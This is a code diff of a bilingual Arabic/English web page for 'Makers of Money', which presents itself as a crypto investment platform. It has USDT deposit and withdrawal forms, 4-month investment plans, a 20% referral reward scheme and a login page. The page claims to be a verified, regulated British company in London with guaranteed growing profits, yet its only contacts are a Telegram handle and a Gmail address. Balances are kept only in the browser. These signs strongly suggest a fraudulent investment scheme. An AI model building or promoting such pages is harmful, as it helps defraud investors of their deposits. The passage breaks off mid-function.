@@ -4,30 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="page-title">صناع المال | Makers of Money</title>
-    <link rel="icon" href="14.png" type="image/png">
     <style>
         :root {
             --bg-color: #0a0a0a;
-            --card-bg: rgba(26, 26, 26, 0.9); /* شفافية خفيفة لتظهر الخلفية */
+            --card-bg: #1a1a1a;
             --primary-color: #d4af37;
             --text-color: #ffffff;
             --text-muted: #aaaaaa;
             --danger: #ff4c4c;
             --success: #28a745;
             --border-color: #2a2a2a;
-            --header-bg: rgba(0, 0, 0, 0.9);
-            --input-bg: rgba(51, 51, 51, 0.9);
+            --header-bg: #000000;
+            --input-bg: #333333;
         }
 
         body.light-mode {
             --bg-color: #f4f6f9;
-            --card-bg: rgba(255, 255, 255, 0.9);
+            --card-bg: #ffffff;
             --primary-color: #b8860b;
             --text-color: #333333;
             --text-muted: #666666;
             --border-color: #dddddd;
-            --header-bg: rgba(255, 255, 255, 0.9);
-            --input-bg: rgba(248, 249, 250, 0.9);
+            --header-bg: #ffffff;
+            --input-bg: #f8f9fa;
         }
 
         * {
@@ -39,27 +38,9 @@
         }
 
         body {
-            position: relative;
             background-color: var(--bg-color);
             color: var(--text-color);
             line-height: 1.6;
-            min-height: 100vh;
-        }
-
-        /* خلفية الموقع الثابتة */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-image: url('—Pngtree—financial planning with interest rates_16361169.jpg');
-            background-size: cover;
-            background-position: center;
-            opacity: 0.1; /* تعتيم الخلفية لتكون متناسقة */
-            z-index: -1;
-            pointer-events: none;
         }
 
         header {
@@ -82,7 +63,6 @@
         .logo-icon {
             width: 45px;
             height: 45px;
-            object-fit: contain;
         }
 
         .logo-text {
@@ -177,6 +157,10 @@
             border: 1px solid var(--border-color);
         }
 
+        body:not(.light-mode) .card {
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
         h2, h3 {
             color: var(--primary-color);
             margin-bottom: 15px;
@@ -200,7 +184,7 @@
             cursor: pointer;
             border-radius: 5px;
             font-weight: bold;
-            transition: background 0.3s, opacity 0.3s;
+            transition: background 0.3s;
             width: 100%;
         }
 
@@ -208,15 +192,15 @@
             color: #000;
         }
 
-        button.btn:hover:not(:disabled) {
+        button.btn:hover {
             opacity: 0.9;
         }
-
+        
         button.btn:disabled {
-            opacity: 0.3;
+            background-color: #555555;
+            color: #999999;
             cursor: not-allowed;
-            background-color: #555;
-            color: #ccc;
+            opacity: 0.6;
         }
 
         .auth-tabs {
@@ -287,6 +271,7 @@
             border-color: var(--primary-color);
         }
 
+        .plan-card h3 { color: var(--text-color); }
         .plan-price { font-size: 28px; color: var(--primary-color); margin: 15px 0; font-weight: bold; }
         
         table {
@@ -324,8 +309,17 @@
 
     <header>
         <div class="brand-area" onclick="handleBrandClick()">
-            <!-- استخدام الصورة المصغرة في الشبكة بجانب الموقع -->
-            <img src="14.png" alt="Makers of Money Logo" class="logo-icon">
+            <svg class="logo-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="aiGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" stop-color="#d4af37" />
+                        <stop offset="100%" stop-color="#fff" />
+                    </linearGradient>
+                </defs>
+                <polygon points="50,5 95,27.5 95,72.5 50,95 5,72.5 5,27.5" fill="none" stroke="url(#aiGrad)" stroke-width="6"/>
+                <path d="M 50 15 L 50 85 M 15 35 L 85 65 M 15 65 L 85 35" stroke="rgba(212, 175, 55, 0.3)" stroke-width="2"/>
+                <text x="50%" y="65%" font-size="45" fill="#d4af37" font-weight="bold" text-anchor="middle" font-family="sans-serif">$</text>
+            </svg>
             <div class="logo-text">
                 <span class="logo-ar" data-ar="صناع المال" data-en="Makers of Money">صناع المال</span>
                 <span class="logo-en" data-ar="Makers of Money" data-en="Investment Platform">Makers of Money</span>
@@ -347,42 +341,36 @@
             <button onclick="showPage('active-plans')" id="nav-active-plans" style="display: none;" data-ar="الخطط النشطة" data-en="Active Plans">الخطط النشطة</button>
             <button onclick="showPage('referral')" id="nav-referral" data-ar="نظام الإحالة" data-en="Referral Program">نظام الإحالة</button>
             <button onclick="showPage('account-info')" id="nav-account-info" data-ar="معلومات الحساب" data-en="Account Info">معلومات الحساب</button>
-            <!-- تم حذف زر الأسواق -->
             <button onclick="showPage('about')" id="nav-about" data-ar="عن الشركة" data-en="About Us">عن الشركة</button>
             <button onclick="logout()" style="color: var(--danger); border-color: var(--danger);" data-ar="تسجيل خروج" data-en="Logout">تسجيل خروج</button>
         </nav>
     </header>
 
     <div class="container">
-        <!-- صفحة المصادقة -->
+        <!-- صفحة تسجيل الدخول والإنشاء -->
         <div id="auth-page" class="page active">
             <div class="card" style="max-width: 500px; margin: 0 auto;">
                 <div class="auth-tabs">
                     <button id="tab-login-btn" class="auth-tab-btn active" onclick="switchAuthTab('login')" data-ar="تسجيل الدخول" data-en="Login">تسجيل الدخول</button>
                     <button id="tab-reg-btn" class="auth-tab-btn" onclick="switchAuthTab('register')" data-ar="إنشاء حساب جديد" data-en="Create Account">إنشاء حساب جديد</button>
                 </div>
-
                 <h2 id="auth-title" style="margin-top: 10px;" data-ar="تسجيل الدخول" data-en="Login">تسجيل الدخول</h2>
-                
                 <div id="login-register-form">
                     <div id="register-fields" style="display: none;">
                         <input type="text" id="reg-fname" data-placeholder-ar="الاسم الأول" data-placeholder-en="First Name" placeholder="الاسم الأول">
                         <input type="text" id="reg-lname" data-placeholder-ar="اللقب" data-placeholder-en="Last Name" placeholder="اللقب">
+                        <input type="text" id="reg-ref-id" data-placeholder-ar="رقم الإحالة (اختياري)" data-placeholder-en="Referral ID (Optional)" placeholder="رقم الإحالة (اختياري)">
                     </div>
                     <input type="email" id="auth-email" data-placeholder-ar="البريد الإلكتروني" data-placeholder-en="Email Address" placeholder="البريد الإلكتروني">
                     <input type="password" id="auth-pass" data-placeholder-ar="الرقم السري" data-placeholder-en="Password" placeholder="الرقم السري">
                     <div id="register-fields-2" style="display: none;">
                         <input type="password" id="auth-pass-confirm" data-placeholder-ar="تأكيد الرقم السري" data-placeholder-en="Confirm Password" placeholder="تأكيد الرقم السري">
-                        <!-- حقل رقم الإحالة الاختياري -->
-                        <input type="text" id="reg-ref-code" data-placeholder-ar="رقم الإحالة (اختياري)" data-placeholder-en="Referral Code (Optional)" placeholder="رقم الإحالة (اختياري)">
                     </div>
                     <button class="btn" id="auth-submit-btn" data-ar="دخول" data-en="Login">دخول</button>
-                    
                     <div style="display: flex; justify-content: flex-end; margin-top: 15px; font-size: 14px;">
                         <span style="cursor: pointer; color: var(--text-muted);" onclick="showForgotPassword()" data-ar="نسيت كلمة المرور؟" data-en="Forgot Password?">نسيت كلمة المرور؟</span>
                     </div>
                 </div>
-
                 <div id="forgot-password-form" style="display: none;">
                     <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 15px;" data-ar="الرجاء إدخال البريد الإلكتروني المسجل لديك لإرسال الرمز المؤقت لإعادة تعيين كلمة المرور." data-en="Please enter your registered email to receive a temporary password reset code.">الرجاء إدخال البريد الإلكتروني المسجل لديك لإرسال الرمز المؤقت لإعادة تعيين كلمة المرور.</p>
                     <input type="email" id="forgot-email-input" data-placeholder-ar="أدخل البريد الإلكتروني" data-placeholder-en="Enter Email Address" placeholder="أدخل البريد الإلكتروني">
@@ -395,27 +383,26 @@
         <div id="home-page" class="page">
             <div class="hero-section">
                 <h1 class="hero-title" data-ar="مرحباً بكم في صناع المال" data-en="Welcome to Makers of Money">مرحباً بكم في صناع المال</h1>
-                <p class="hero-subtitle" data-ar="شركة بريطانية استثمارية موثقة - منصتك الأولى للاستثمار الآمن عبر الهواتف والأجهزة الذكية" data-en="A Trusted British Investment Company - Your premier platform for smart, secure investment">شركة بريطانية استثمارية موثقة - منصتك الأولى للاستثمار الآمن عبر الهواتف والأجهزة الذكية</p>
+                <p class="hero-subtitle" data-ar="منصتك الأولى للاستثمار الآمن الذكي عبر الهواتف والأجهزة الذكية" data-en="Your premier platform for smart, secure investment via mobile and digital devices">منصتك الأولى للاستثمار الآمن الذكي عبر الهواتف والأجهزة الذكية</p>
             </div>
-
             <div class="plans-grid" style="margin-top: 40px;">
                 <div class="card" style="text-align: center;">
                     <h3 data-ar="استثمار مرن وآمن" data-en="Flexible & Secure">استثمار مرن وآمن</h3>
-                    <p style="color: var(--text-muted);" data-ar="تابع أموالك وأرباحك لحظة بلحظة بضمان شركة استثمارية بريطانية موثقة." data-en="Track your funds and profits moment by moment guaranteed by a trusted British investment company.">تابع أموالك وأرباحك لحظة بلحظة بضمان شركة استثمارية بريطانية موثقة.</p>
+                    <p style="color: var(--text-muted);" data-ar="تابع أموالك وأرباحك لحظة بلحظة من هاتفك المحمول." data-en="Track your funds and profits moment by moment.">تابع أموالك وأرباحك لحظة بلحظة من هاتفك المحمول.</p>
                 </div>
                 <div class="card" style="text-align: center;">
                     <h3 data-ar="أرباح شهرية متزايدة" data-en="Monthly Growing Profits">أرباح شهرية متزايدة</h3>
-                    <p style="color: var(--text-muted);" data-ar="تزايد شهري للأرباح حتى الوصول إلى أقصى عائد بنسبة 80% + رأس المال خلال 4 شهور." data-en="Monthly profit growth until reaching 80% + initial capital within 4 months.">تزايد شهري للأرباح حتى الوصول إلى أقصى عائد بنسبة 80% + رأس المال خلال 4 شهور.</p>
+                    <p style="color: var(--text-muted);" data-ar="تزايد شهري للأرباح ضمن عقود موثقة لمدة 4 شهور." data-en="Monthly profit growth within verified 4-month contracts.">تزايد شهري للأرباح ضمن عقود موثقة لمدة 4 شهور.</p>
                 </div>
                 <div class="card" style="text-align: center;">
                     <h3 data-ar="دعم متواصل 24/7" data-en="24/7 Support">دعم متواصل 24/7</h3>
-                    <p style="color: var(--text-muted);" data-ar="فريق متخصص في مقرنا بلندن جاهز لمساعدتك في إتمام صفقاتك وعمليات السحب." data-en="Dedicated team in our London HQ ready to help complete your transactions.">فريق متخصص في مقرنا بلندن جاهز لمساعدتك في إتمام صفقاتك وعمليات السحب.</p>
+                    <p style="color: var(--text-muted);" data-ar="فريق متخصص جاهز لمساعدتك في عمليات السحب والإيداع." data-en="Dedicated team ready to help you with deposits and withdrawals.">فريق متخصص جاهز لمساعدتك في عمليات السحب والإيداع.</p>
                 </div>
             </div>
         </div>
 
         <div id="plans-page" class="page">
-            <h2 data-ar="باقات الاستثمار (تزايد شهري للأرباح حتى بلوغ 80% أرباح + رأس المال)" data-en="Investment Packages (Monthly Profit Growth up to 80% Profit + Capital)">باقات الاستثمار (تزايد شهري للأرباح حتى بلوغ 80% أرباح + رأس المال)</h2>
+            <h2 data-ar="باقات الاستثمار (مدة العقد 4 شهور)" data-en="Investment Packages (Contract Duration 4 Months)">باقات الاستثمار (مدة العقد 4 شهور)</h2>
             <div class="plans-grid" id="plans-container-grid"></div>
         </div>
 
@@ -428,7 +415,6 @@
                             <th data-ar="اسم الخطة" data-en="Plan Name">اسم الخطة</th>
                             <th data-ar="قيمة الاستثمار" data-en="Investment">قيمة الاستثمار</th>
                             <th data-ar="الأرباح الحالية" data-en="Current Profit">الأرباح الحالية</th>
-                            <th data-ar="الهدف الأقصى (80% أرباح)" data-en="Max Target (80% Profit)">الهدف الأقصى (80% أرباح)</th>
                             <th data-ar="موعد الربح القادم" data-en="Next Profit Date">موعد الربح القادم</th>
                             <th data-ar="الحالة" data-en="Status">الحالة</th>
                         </tr>
@@ -443,13 +429,12 @@
             <div class="card">
                 <h2 data-ar="نظام الإحالة والأصدقاء" data-en="Referral & Friends Program">نظام الإحالة والأصدقاء</h2>
                 <div class="info-box" style="margin-bottom: 20px; background: var(--input-bg); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
-                    <strong style="color: var(--primary-color);" data-ar="رابط الإحالة الخاص بك (أو رقم الإحالة):" data-en="Your Referral Link (or Code):">رابط الإحالة الخاص بك (أو رقم الإحالة):</strong>
+                    <strong style="color: var(--primary-color);" data-ar="رابط الإحالة الخاص بك:" data-en="Your Referral Link:">رابط الإحالة الخاص بك:</strong>
                     <div style="display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap;">
-                        <input type="text" id="referral-link-input" readonly style="flex: 1; margin-bottom: 0;">
+                        <input type="text" id="referral-link-input" readonly value="" style="flex: 1; margin-bottom: 0;">
                         <button class="btn" style="width: auto; padding: 0 20px;" onclick="copyReferralLink()" data-ar="نسخ الرابط" data-en="Copy Link">نسخ الرابط</button>
                     </div>
                 </div>
-
                 <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px;">
                     <div class="info-box" style="text-align: center; background: var(--input-bg); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
                         <h3 id="ref-count-display" style="color: var(--primary-color); font-size: 24px; margin-bottom: 5px;">0</h3>
@@ -460,26 +445,6 @@
                         <p style="color: var(--text-muted); font-size: 14px;" data-ar="إجمالي مكافآت الإحالة (20%)" data-en="Total Referral Rewards (20%)">إجمالي مكافآت الإحالة (20%)</p>
                     </div>
                 </div>
-
-                <div style="margin-top: 30px; overflow-x: auto; border-top: 1px solid var(--border-color); padding-top: 20px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px;">
-                        <h3 style="margin: 0;" data-ar="معلومات المسجلين عبر إحالتك" data-en="Referrals Information">معلومات المسجلين عبر إحالتك</h3>
-                        <button class="btn" style="width: auto; background-color: var(--success);" onclick="claimReferralRewards()" data-ar="سحب المكافآت إلى الرصيد المتاح" data-en="Withdraw Rewards to Available Balance">سحب المكافآت إلى الرصيد المتاح</button>
-                    </div>
-                    
-                    <table style="min-width: 600px;">
-                        <thead>
-                            <tr>
-                                <th data-ar="اسم المسجل" data-en="Registered Name">اسم المسجل</th>
-                                <th data-ar="مبلغ الإيداع" data-en="Deposit Amount">مبلغ الإيداع</th>
-                                <th data-ar="المكافأة (20%)" data-en="Reward (20%)">المكافأة (20%)</th>
-                                <th data-ar="حالة المكافأة" data-en="Reward Status">حالة المكافأة</th>
-                            </tr>
-                        </thead>
-                        <tbody id="referrals-table-body">
-                        </tbody>
-                    </table>
-                </div>
             </div>
         </div>
 
@@ -488,7 +453,7 @@
                 <h2 data-ar="لوحة التحكم والمحفظة" data-en="Dashboard & Wallet">لوحة التحكم والمحفظة</h2>
                 <div style="display: flex; justify-content: space-between; flex-wrap: wrap; gap: 20px;">
                     <div>
-                        <p style="margin-bottom: 5px;"><strong data-ar="الاسم:" data-en="Name:">الاسم:</strong> <span id="display-client-name">عميل صناع المال</span> (ID: <span id="display-client-id">987654</span>)</p>
+                        <p style="margin-bottom: 5px;"><strong data-ar="الاسم:" data-en="Name:">الاسم:</strong> <span id="display-client-name">عميل صناع المال</span></p>
                         <p><strong data-ar="الإيميل:" data-en="Email:">الإيميل:</strong> <span id="display-client-email">user@example.com</span> <span id="email-status-badge" style="color: var(--danger);" data-ar="(غير متحقق منه)" data-en="(Unverified)">(غير متحقق منه)</span> <button id="verify-email-btn" style="background:none; border:none; color:var(--primary-color); cursor:pointer; font-weight:bold; margin-right:10px;" onclick="verifyEmail()" data-ar="تأكيد الإيميل" data-en="Verify Email">تأكيد الإيميل</button></p>
                     </div>
                     <div style="text-align: left; background: rgba(212, 175, 55, 0.1); padding: 15px; border-radius: 8px; border: 1px solid rgba(212, 175, 55, 0.3);">
@@ -509,28 +474,25 @@
                     <div id="deposit-area" style="display:none; margin-top: 20px; background:var(--input-bg); padding:15px; border-radius:5px; border: 1px dashed var(--primary-color);">
                         <p style="color: var(--text-muted); font-size:14px;"><strong data-ar="عنوان المحفظة للتحويل:" data-en="Wallet Address for Transfer:">عنوان المحفظة للتحويل:</strong></p>
                         <p id="wallet-address" style="word-break: break-all; color: var(--primary-color); user-select: all; font-size: 18px; margin: 10px 0; background: var(--header-bg); padding: 10px; border-radius: 5px;">---</p>
-                        <input type="text" data-placeholder-ar="أدخل رقم الهاش للمعاملة (TxID)" data-placeholder-en="Enter Transaction Hash (TxID)" placeholder="أدخل رقم الهاش للمعاملة (TxID)" style="margin-top:10px;">
+                        <input type="text" id="deposit-hash" data-placeholder-ar="أدخل رقم الهاش للمعاملة (TxID)" data-placeholder-en="Enter Transaction Hash (TxID)" placeholder="أدخل رقم الهاش للمعاملة (TxID)" style="margin-top:10px;">
                         <p style="font-size:14px; margin-bottom:5px;" data-ar="إرفاق صورة التحويل (سكرين شوت):" data-en="Attach Transfer Screenshot:">إرفاق صورة التحويل (سكرين شوت):</p>
-                        <input type="file" accept="image/*" style="background: transparent; border: none; padding: 0;">
-                        <button class="btn" onclick="confirmDeposit()" data-ar="تأكيد الإيداع وإرسال للمراجعة" data-en="Confirm Deposit & Submit for Review">تأكيد الإيداع وإرسال للمراجعة</button>
+                        <input type="file" id="deposit-file" accept="image/*" style="background: transparent; border: none; padding: 0;">
+                        <button class="btn" onclick="confirmDeposit()" data-ar="تأكيد الإيداع" data-en="Confirm Deposit">تأكيد الإيداع</button>
+                        <p style="font-size: 12px; color: var(--text-muted); margin-top: 10px; text-align: center;" data-ar="الرجاء انتظار موافقة الإيداع من قبل خدمة العملاء بعد رفع الطلب" data-en="Please wait for deposit approval from customer service after submitting">الرجاء انتظار موافقة الإيداع من قبل خدمة العملاء بعد رفع الطلب</p>
                     </div>
                 </div>
 
                 <div class="card">
                     <h2 data-ar="سحب الرصيد المتاح" data-en="Withdraw Available Balance">سحب الرصيد المتاح</h2>
                     <input type="number" id="withdraw-amount" data-placeholder-ar="أدخل مبلغ السحب ($)" data-placeholder-en="Enter withdrawal amount ($)" placeholder="أدخل مبلغ السحب ($)" min="1">
-                    
                     <button class="btn" style="margin-bottom: 10px;" onclick="showWithdraw('BEP20')" data-ar="سحب عبر USDT BEP 20" data-en="Withdraw via USDT BEP 20">سحب عبر USDT BEP 20</button>
                     <button class="btn" style="margin-bottom: 10px;" onclick="showWithdraw('TRX20')" data-ar="سحب عبر USDT TRX 20" data-en="Withdraw via USDT TRX 20">سحب عبر USDT TRX 20</button>
                     
                     <div id="withdraw-area" style="display:none; margin-top: 20px; background:var(--input-bg); padding:15px; border-radius:5px; border: 1px dashed var(--primary-color);">
                         <p style="color: var(--text-muted); font-size:14px;"><strong id="withdraw-address-label">عنوان المحفظة:</strong></p>
                         <input type="text" id="withdraw-address-input" placeholder="" style="margin-top:10px;">
-                        <button class="btn" onclick="confirmWithdraw()" data-ar="طلب السحب للمراجعة" data-en="Request Withdrawal for Review">طلب السحب للمراجعة</button>
-                    </div>
-
-                    <div id="withdrawal-email-alert" style="margin-top: 15px; padding: 10px; background: rgba(255, 76, 76, 0.1); border-left: 3px solid var(--danger); border-radius: 4px;">
-                        <p style="font-size:13px; color:var(--danger);" data-ar="* تنبيه الأمان: لا يمكن إتمام عملية السحب إلا بعد التحقق من البريد الإلكتروني الخاص بك." data-en="* Security Alert: Withdrawals cannot be completed without email verification.">* تنبيه الأمان: لا يمكن إتمام عملية السحب إلا بعد التحقق من البريد الإلكتروني الخاص بك.</p>
+                        <button class="btn" onclick="confirmWithdraw()" data-ar="تأكيد السحب" data-en="Confirm Withdrawal">تأكيد السحب</button>
+                        <p style="font-size: 12px; color: var(--text-muted); margin-top: 10px; text-align: center;" data-ar="الرجاء انتظار موافقة السحب من قبل خدمة العملاء بعد رفع الطلب" data-en="Please wait for withdrawal approval from customer service after submitting">الرجاء انتظار موافقة السحب من قبل خدمة العملاء بعد رفع الطلب</p>
                     </div>
                 </div>
             </div>
@@ -539,23 +501,12 @@
         <div id="account-info-page" class="page">
             <div class="card" style="max-width: 900px; margin: 0 auto 20px auto;">
                 <h2 data-ar="معلومات الحساب الشخصي" data-en="Personal Account Information">معلومات الحساب الشخصي</h2>
-                
                 <div class="info-box" style="display: flex; flex-direction: column; gap: 15px; background: var(--input-bg); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
-                    <div>
-                        <strong style="color: var(--primary-color);" data-ar="الاسم الكامل:" data-en="Full Name:">الاسم الكامل:</strong>
-                        <span id="acc-full-name" style="margin-right: 10px;">عميل صناع المال</span>
-                    </div>
-                    <div>
-                        <strong style="color: var(--primary-color);" data-ar="البريد الإلكتروني:" data-en="Email Address:">البريد الإلكتروني:</strong>
-                        <span id="acc-email" style="margin-right: 10px;">user@example.com</span>
-                    </div>
-                    <div>
-                        <strong style="color: var(--primary-color);" data-ar="معرف العميل (ID):" data-en="Client ID:">معرف العميل (ID):</strong>
-                        <span id="acc-client-id" style="margin-right: 10px;">987654</span>
-                    </div>
+                    <div><strong style="color: var(--primary-color);" data-ar="الاسم الكامل:" data-en="Full Name:">الاسم الكامل:</strong> <span id="acc-full-name">عميل صناع المال</span></div>
+                    <div><strong style="color: var(--primary-color);" data-ar="البريد الإلكتروني:" data-en="Email Address:">البريد الإلكتروني:</strong> <span id="acc-email">user@example.com</span></div>
+                    <div><strong style="color: var(--primary-color);" data-ar="الرصيد المتاح حالياً:" data-en="Current Available Balance:">الرصيد المتاح حالياً:</strong> <span id="acc-balance" style="color: var(--success); font-weight: bold;">$0.00</span></div>
                 </div>
             </div>
-
             <div class="card" style="overflow-x: auto; max-width: 900px; margin: 0 auto;">
                 <h2 data-ar="سجل المعاملات" data-en="Transaction History">سجل المعاملات</h2>
                 <table style="min-width: 600px;">
@@ -576,32 +527,21 @@
         <div id="about-page" class="page">
             <div class="card">
                 <h2 data-ar="عن شركة صناع المال (Makers of Money)" data-en="About Makers of Money">عن شركة صناع المال (Makers of Money)</h2>
-                <p style="font-size: 16px; margin-bottom: 20px;" data-ar="نحن شركة بريطانية عالمية استثمارية موثقة ومعتمدة ومصرح بها وخاضعة للرقابة المباشرة. نعمل في مجالات متعددة وواعدة بضمانات حقيقية للحفاظ على استقرار رأس المال ونموه." data-en="We are a trusted, global British investment company, authorized and subject to direct regulation. We operate in promising fields with real guarantees to maintain capital stability and growth.">نحن شركة بريطانية عالمية استثمارية موثقة ومعتمدة ومصرح بها وخاضعة للرقابة المباشرة. نعمل في مجالات متعددة وواعدة بضمانات حقيقية للحفاظ على استقرار رأس المال ونموه.</p>
-                <p style="color: var(--primary-color); font-weight:bold; margin-bottom: 20px;" data-ar="📍 مقر الشركة: لندن، المملكة المتحدة (London, UK)" data-en="📍 Headquarters: London, United Kingdom">📍 مقر الشركة: لندن، المملكة المتحدة (London, UK)</p>
-                
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 25px; text-align: center;">
-                    <div class="info-box" style="background: var(--input-bg); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
-                        <h3 style="color: var(--primary-color); font-size: 24px; margin-bottom: 5px;">935K</h3>
-                        <p style="color: var(--text-muted); font-size: 14px;" data-ar="عميل مسجل" data-en="Registered Clients">عميل مسجل</p>
-                    </div>
-                    <div class="info-box" style="background: var(--input-bg); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
-                        <h3 style="color: var(--primary-color); font-size: 24px; margin-bottom: 5px;">⭐ 4.9 / 5</h3>
-                        <p style="color: var(--text-muted); font-size: 14px;" data-ar="تقييمات الأعضاء وموثوقية" data-en="5 Stars Trust Rating">تقييمات الأعضاء وموثوقية</p>
-                    </div>
+                <p style="font-size: 16px; margin-bottom: 20px;" data-ar="نحن شركة بريطانية استثمارية موثقة وخاضعة للضرائب والرقابة المباشرة. نعمل في مجالات واعدة ونلتزم بالشفافية والتقة العالية لحماية استثمارات عملائنا." data-en="We are a verified British investment company subject to direct taxation and regulation. We operate in promising fields and adhere to high transparency and trust to protect our clients' investments.">نحن شركة بريطانية استثمارية موثقة وخاضعة للضرائب والرقابة المباشرة. نعمل في مجالات واعدة ونلتزم بالشفافية والتقة العالية لحماية استثمارات عملائنا.</p>
+                <div style="background: var(--input-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); text-align: center; margin-bottom: 20px;">
+                    <strong style="color: var(--primary-color); font-size: 18px;" data-ar="مقر الشركة: لندن، المملكة المتحدة" data-en="Company Location: London, United Kingdom">مقر الشركة: لندن، المملكة المتحدة</strong>
                 </div>
             </div>
         </div>
-
     </div>
 
     <footer>
         <h3 data-ar="خدمة العملاء (24/7)" data-en="Customer Support (24/7)">خدمة العملاء (24/7)</h3>
-        <p style="color: var(--text-muted); margin-bottom: 10px;" data-ar="فريق الدعم في لندن متاح على مدار الساعة للإجابة على استفساراتكم والموافقة على عمليات السحب والإيداع." data-en="Our London support team is available 24/7 to answer inquiries and approve transactions.">فريق الدعم في لندن متاح على مدار الساعة للإجابة على استفساراتكم والموافقة على عمليات السحب والإيداع.</p>
+        <p style="color: var(--text-muted); margin-bottom: 20px;" data-ar="فريق الدعم متاح على مدار الساعة للإجابة على استفساراتكم." data-en="Support team is available 24/7 to answer your inquiries.">فريق الدعم متاح على مدار الساعة للإجابة على استفساراتكم.</p>
         <div class="contact-links">
             <a href="https://t.me/mm2033070" target="_blank">💬 تليجرام: @mm2033070</a>
             <a href="mailto:makers2481@gmail.com">📧 الإيميل: makers2481@gmail.com</a>
         </div>
-        <p style="margin-top: 30px; font-size: 13px; color: #555;" data-ar="جميع الحقوق محفوظة © لصناع المال (Makers of Money) - لندن، المملكة المتحدة" data-en="All rights reserved © Makers of Money - London, UK">جميع الحقوق محفوظة © لصناع المال (Makers of Money) - لندن، المملكة المتحدة</p>
     </footer>
 
     <script>
@@ -610,116 +550,62 @@
         let currentLang = 'ar';
         let currentDepositNetwork = '';
         let currentWithdrawNetwork = '';
-        
         let userBalance = 0.00;
-        let totalAddedProfits = 0.00;
         let activePlansList = [];
         let referralCount = 0;
         let referralEarnings = 0.00;
         let referralsList = []; 
-        let transactionsList = []; 
-        
+        let transactionsList = [];
         let clientFirstName = "عميل";
         let clientLastName = "صناع المال";
         let clientEmail = "user@example.com";
-        let clientId = Math.floor(100000 + Math.random() * 900000); // توليد ID عشوائي أو استعادته من البيانات
-
         let registeredUsers = [];
+        let clientId = Math.floor(Math.random() * 900000) + 100000;
+
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const refId = urlParams.get('ref');
+            if (refId) {
+                setTimeout(() => {
+                    openAuthModal('register');
+                    const refInput = document.getElementById('reg-ref-id');
+                    if(refInput) refInput.value = refId;
+                }, 100);
+            }
+        }
 
         function saveState() {
             localStorage.setItem('isUserLoggedIn', isUserLoggedIn);
             localStorage.setItem('isEmailVerified', isEmailVerified);
             localStorage.setItem('userBalance', userBalance);
-            localStorage.setItem('totalAddedProfits', totalAddedProfits);
             localStorage.setItem('activePlansList', JSON.stringify(activePlansList));
-            localStorage.setItem('referralCount', referralCount);
-            localStorage.setItem('referralEarnings', referralEarnings);
-            localStorage.setItem('referralsList', JSON.stringify(referralsList));
-            localStorage.setItem('transactionsList', JSON.stringify(transactionsList)); 
-            localStorage.setItem('clientFirstName', clientFirstName);
-            localStorage.setItem('clientLastName', clientLastName);
+            localStorage.setItem('transactionsList', JSON.stringify(transactionsList));
             localStorage.setItem('clientEmail', clientEmail);
             localStorage.setItem('clientId', clientId);
             localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
-            
-            if (clientEmail) {
-                let userIndex = registeredUsers.findIndex(u => u.email === clientEmail);
-                if (userIndex !== -1) {
-                    registeredUsers[userIndex].balance = userBalance;
-                    registeredUsers[userIndex].totalAddedProfits = totalAddedProfits;
-                    registeredUsers[userIndex].activePlansList = activePlansList;
-                    registeredUsers[userIndex].referralCount = referralCount;
-                    registeredUsers[userIndex].referralEarnings = referralEarnings;
-                    registeredUsers[userIndex].referralsList = referralsList;
-                    registeredUsers[userIndex].transactionsList = transactionsList; 
-                    registeredUsers[userIndex].isEmailVerified = isEmailVerified;
-                    registeredUsers[userIndex].fname = clientFirstName;
-                    registeredUsers[userIndex].lname = clientLastName;
-                    registeredUsers[userIndex].clientId = clientId;
-                    localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
-                }
-            }
         }
 
         function loadState() {
             registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
-            
-            // تحقق من رابط الإحالة القادم في الرابط
-            const urlParams = new URLSearchParams(window.location.search);
-            const refParam = urlParams.get('ref');
-            
             if (localStorage.getItem('isUserLoggedIn') === 'true') {
                 isUserLoggedIn = true;
                 clientEmail = localStorage.getItem('clientEmail') || "user@example.com";
-                
+                clientId = localStorage.getItem('clientId') || Math.floor(Math.random() * 900000) + 100000;
                 let currentUser = registeredUsers.find(u => u.email === clientEmail);
                 if (currentUser) {
-                    userBalance = currentUser.balance !== undefined ? currentUser.balance : 0;
-                    totalAddedProfits = currentUser.totalAddedProfits !== undefined ? currentUser.totalAddedProfits : 0;
-                    activePlansList = currentUser.activePlansList !== undefined ? currentUser.activePlansList : [];
-                    referralCount = currentUser.referralCount !== undefined ? currentUser.referralCount : 0;
-                    referralEarnings = currentUser.referralEarnings !== undefined ? currentUser.referralEarnings : 0;
-                    referralsList = currentUser.referralsList !== undefined ? currentUser.referralsList : [];
-                    transactionsList = currentUser.transactionsList !== undefined ? currentUser.transactionsList : []; 
-                    isEmailVerified = currentUser.isEmailVerified !== undefined ? currentUser.isEmailVerified : false;
+                    userBalance = currentUser.balance || 0;
+                    activePlansList = currentUser.activePlansList || [];
+                    transactionsList = currentUser.transactionsList || [];
+                    isEmailVerified = currentUser.isEmailVerified || false;
                     clientFirstName = currentUser.fname || "عميل";
                     clientLastName = currentUser.lname || "صناع المال";
-                    clientId = currentUser.clientId || Math.floor(100000 + Math.random() * 900000);
                 }
-            } else if(refParam) {
-                // إذا لم يكن مسجل دخول وجاء عبر رابط إحالة
-                setTimeout(() => {
